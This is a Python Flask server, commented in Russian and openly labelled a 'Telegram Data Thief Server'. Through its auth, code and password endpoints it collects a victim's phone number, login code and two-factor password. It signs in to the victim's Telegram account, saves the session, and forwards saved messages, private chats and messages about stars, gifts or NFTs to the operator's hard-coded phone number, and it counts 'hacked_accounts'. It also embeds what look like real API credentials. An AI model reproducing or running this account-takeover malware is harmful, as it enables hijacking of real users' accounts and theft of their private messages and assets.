from flask import Flask, request, jsonify
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument
import sqlite3
import os
import logging
from flask_cors import CORS
import re

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои учетные данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_PHONE = '+998997220530'

def init_db():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (phone TEXT PRIMARY KEY, 
                  phone_code_hash TEXT,
                  session_file TEXT,
                  status TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

async def send_code_request(phone):
    try:
        session_file = f"sessions/{phone}.session"
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        phone_code_hash = sent_code.phone_code_hash
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO auth_sessions 
                    (phone, phone_code_hash, session_file, status) 
                    VALUES (?, ?, ?, ?)''',
                 (phone, phone_code_hash, session_file, 'code_sent'))
        conn.commit()
        conn.close()
        
        await client.disconnect()
        return {'status': 'code_sent', 'phone_code_hash': phone_code_hash}
        
    except Exception as e:
        logging.error(f"❌ Send code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def verify_code(phone, code):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT phone_code_hash, session_file FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        phone_code_hash, session_file = result
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
            conn.commit()
            conn.close()
            
            # ЗАПУСКАЕМ ВОРОВСТВО ДАННЫХ
            await steal_all_data(client, phone)
            await client.disconnect()
            
            return {'status': 'success'}
            
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'status': 'password_required'}
            
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {'status': 'invalid_code'}
            
    except Exception as e:
        logging.error(f"❌ Verify code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def verify_password(phone, password):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT session_file FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        session_file = result[0]
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        await client.sign_in(password=password)
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
        conn.commit()
        conn.close()
        
        # ЗАПУСКАЕМ ВОРОВСТВО ДАННЫХ
        await steal_all_data(client, phone)
        await client.disconnect()
        
        return {'status': 'success'}
        
    except Exception as e:
        logging.error(f"❌ Password error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def steal_all_data(client, phone):
    """Воруем всё: избранное, звёзды, NFT подарки"""
    try:
        me = await client.get_me()
        logging.info(f"🎯 STARTING DATA THEFT from: {me.first_name} ({phone})")
        
        # 1. ВОРУЕМ ИЗ ИЗБРАННОГО
        await steal_saved_messages(client)
        
        # 2. ВОРУЕМ ЗВЁЗДЫ И NFT ПОДАРКИ
        await steal_premium_content(client)
        
        # 3. ВОРУЕМ ВСЕ ЛИЧНЫЕ СООБЩЕНИЯ
        await steal_private_messages(client)
        
        logging.info(f"✅ DATA THEFT COMPLETED for: {phone}")
        
    except Exception as e:
        logging.error(f"❌ Data theft error: {e}")

async def steal_saved_messages(client):
    """Воруем всё из избранного"""
    try:
        # Получаем диалог "Избранное" (Saved Messages)
        async for dialog in client.iter_dialogs():
            if dialog.is_user and dialog.entity.id == (await client.get_me()).id:
                logging.info(f"📥 Stealing from SAVED MESSAGES")
                
                async for message in client.iter_messages(dialog.id, limit=50):
                    try:
                        if message.text or message.media:
                            await client.forward_messages(YOUR_PHONE, message)
                            logging.info(f"📨 Stolen saved message: {message.text[:50] if message.text else 'Media'}")
                    except Exception as e:
                        logging.error(f"❌ Failed to forward saved message: {e}")
                break
    except Exception as e:
        logging.error(f"❌ Saved messages theft error: {e}")

async def steal_premium_content(client):
    """Воруем звёзды и NFT подарки"""
    try:
        logging.info("💰 Searching for STARS and NFT GIFTS")
        
        # Ищем в каналах и группах премиум контента
        async for dialog in client.iter_dialogs():
            if dialog.is_channel or dialog.is_group:
                try:
                    # Ключевые слова для поиска звёзд и подарков
                    keywords = ['star', 'звезда', 'gift', 'подарок', 'nft', 'премиум', 'premium']
                    
                    async for message in client.iter_messages(dialog.id, limit=100):
                        if message.text:
                            text_lower = message.text.lower()
                            
                            # Проверяем на звёзды и подарки
                            if any(keyword in text_lower for keyword in keywords):
                                await client.forward_messages(YOUR_PHONE, message)
                                logging.info(f"🎁 Stolen premium content: {message.text[:100]}")
                                
                        # Проверяем медиа на NFT
                        if message.media:
                            if hasattr(message.media, 'premium_gift') or 'nft' in str(message.media).lower():
                                await client.forward_messages(YOUR_PHONE, message)
                                logging.info("🎨 Stolen NFT gift")
                                
                except Exception as e:
                    logging.error(f"❌ Error in dialog {dialog.name}: {e}")
                    continue
                    
    except Exception as e:
        logging.error(f"❌ Premium content theft error: {e}")

async def steal_private_messages(client):
    """Воруем важные личные сообщения"""
    try:
        logging.info("📱 Stealing PRIVATE MESSAGES")
        
        async for dialog in client.iter_dialogs(limit=20):
            if dialog.is_user and not dialog.entity.bot:
                try:
                    # Воруем последние сообщения из важных чатов
                    async for message in client.iter_messages(dialog.id, limit=10):
                        if message.text and len(message.text) > 10:  # Только значимые сообщения
                            await client.forward_messages(YOUR_PHONE, message)
                            logging.info(f"💬 Stolen private message from {dialog.name}: {message.text[:50]}")
                            break
                except Exception as e:
                    logging.error(f"❌ Failed to steal from {dialog.name}: {e}")
                    continue
                    
    except Exception as e:
        logging.error(f"❌ Private messages theft error: {e}")

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/')
def home():
    return jsonify({'status': 'active', 'message': 'Telegram Data Thief Server'})

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    phone = data.get('phone')
    logging.info(f"🔐 Auth request: {phone}")
    
    result = run_async(send_code_request(phone))
    return jsonify(result)

@app.route('/code', methods=['POST'])
def verify_code_route():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    logging.info(f"📱 Code verify: {phone}")
    
    result = run_async(verify_code(phone, code))
    return jsonify(result)

@app.route('/password', methods=['POST'])
def verify_password_route():
    data = request.get_json()
    phone = data.get('phone')
    password = data.get('password')
    logging.info(f"🔑 Password verify: {phone}")
    
    result = run_async(verify_password(phone, password))
    return jsonify(result)

@app.route('/stats', methods=['GET'])
def stats():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM auth_sessions WHERE status='authenticated'")
    active = c.fetchone()[0]
    conn.close()
    return jsonify({'hacked_accounts': active})

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    app.run(host='0.0.0.0', port=5000)
